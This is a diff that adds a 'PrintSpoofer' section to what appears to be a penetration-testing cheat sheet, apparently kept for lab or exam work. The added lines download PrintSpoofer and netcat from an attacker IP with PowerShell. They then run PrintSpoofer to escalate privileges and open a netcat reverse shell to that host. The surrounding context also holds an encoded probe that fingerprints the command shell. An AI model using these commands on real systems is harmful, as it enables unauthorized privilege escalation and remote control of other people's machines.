@@ -85,6 +85,13 @@ fuser -k 8080/tcp
 (dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell
 ```
 
+## PrintSpoofer
+```bash
+iwr -uri http://192.168.45.176/PrintSpoofer64.exe -Outfile PrintSpoofer.exe
+iwr -uri http://192.168.45.176/nc.exe -Outfile nc.exe
+.\PrintSpoofer.exe -c "C:\TEMP\nc.exe 192.168.45.176 1337 -e cmd"
+```
+
 
 # HTTP/HTTPS(80,8080,8000,443...)
 
